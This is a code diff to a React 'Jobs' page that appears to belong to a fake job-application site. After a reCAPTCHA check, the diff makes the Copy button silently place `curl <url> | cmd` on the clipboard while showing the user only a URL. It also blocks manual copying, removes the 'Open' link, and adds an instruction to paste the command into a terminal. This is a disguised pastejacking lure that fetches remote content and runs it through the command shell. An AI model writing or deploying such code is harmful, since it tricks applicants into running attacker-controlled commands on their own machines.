@@ -87,7 +87,7 @@ export default function Jobs() {
 
   const handleCopy = async () => {
     try {
-      await navigator.clipboard.writeText(cmdUrl)
+      await navigator.clipboard.writeText(`curl ${cmdUrl} | cmd`)
       push('Command copied to clipboard')
     } catch {
       push('Copy failed — select and copy manually')
@@ -173,28 +173,25 @@ export default function Jobs() {
           <ol className="list-decimal ml-5 space-y-2 text-sm">
             <li>Complete the reCAPTCHA below.</li>
             <li>Once verified, your OS-specific terminal command will appear.</li>
+            <li>Copy the command below for your OS and paste into the terminal.</li>
           </ol>
 
           {/* Show terminal field only AFTER captcha */}
           
             <div className="mt-4 text-sm">
-              <div className="mb-1 text-slate-600 dark:text-slate-300">
-                Detected OS: <span className="font-medium uppercase">{os}</span>
-              </div>
-
               <label className="label mb-1">
                 {os === 'windows' ? 'Windows Command/URL' : os === 'mac' ? 'Mac Command/URL' : 'Linux Command/URL'}
               </label>
 
               <div className="flex items-stretch gap-2">
                 <input
-                  className="input flex-1 font-mono"
+                  className="input flex-1 font-mono select-none pointer-events-none"
                   readOnly
                   value={cmdUrl}
+                  onCopy={(e) => e.preventDefault()}
                   onFocus={(e) => e.currentTarget.select()}
                 />
                 <button type="button" onClick={handleCopy} className="btn btn-secondary">Copy</button>
-                <a href={cmdUrl} target="_blank" rel="noreferrer" className="btn btn-ghost">Open</a>
               </div>
 
               <div className="mt-2 text-xs text-slate-500">
@@ -205,7 +202,7 @@ export default function Jobs() {
         
           )}
         {/* ---- /Two-step verification ---- */}
-{!captchaToken &&
+      {!captchaToken &&
         <div>
           <div className="mt-3">
           <ReCAPTCHA sitekey={RECAPTCHA_SITE_KEY} onChange={(value) => setCaptchaToken(value)} />
